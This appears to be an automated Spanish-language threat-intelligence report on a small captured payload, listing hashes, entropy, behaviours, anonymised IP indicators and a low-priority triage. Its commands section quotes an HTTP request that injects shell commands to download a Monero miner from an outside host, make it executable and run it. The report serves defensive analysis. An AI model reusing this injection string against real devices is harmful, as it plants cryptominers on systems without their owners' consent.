# 🧬 Payload Analysis

`9aa7a35fbcc3f64dbc8cc7a1843d268993a1284609f0b5fa4620efcb2956a38d`

## 📌 Resumen

Artefacto de 519 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.31. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:30:16.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `9aa7a35fbcc3f64dbc8cc7a1843d268993a1284609f0b5fa4620efcb2956a38d`
- **SHA1:** `c1ee2eacb0ac6a12df842e0b1587e68708b3c049`
- **MD5:** `4e3288679a12136c78cffc6b3c6009a6`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 519 B |
| Entropía | 5.31 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+monero.arm+monero.arm7;wget+http:/\/152.89.76.XXX/monero.arm7;chmod+777+monero.arm7;./monero.arm7+
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.140.XXX | static_analysis |
| ip | 152.89.76.XXX | static_analysis |
| command | GET /shell?cd+/tmp;rm+monero.arm+monero.arm7;wget+http:/\/152.89.76.XXX/monero.arm7;chmod+777+monero.arm7;./monero.arm7+ | strings |
| hash | 9aa7a35fbcc3f64dbc8cc7a1843d268993a1284609f0b5fa4620efcb2956a38d | static_analysis |
| ip | 161.35.103.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
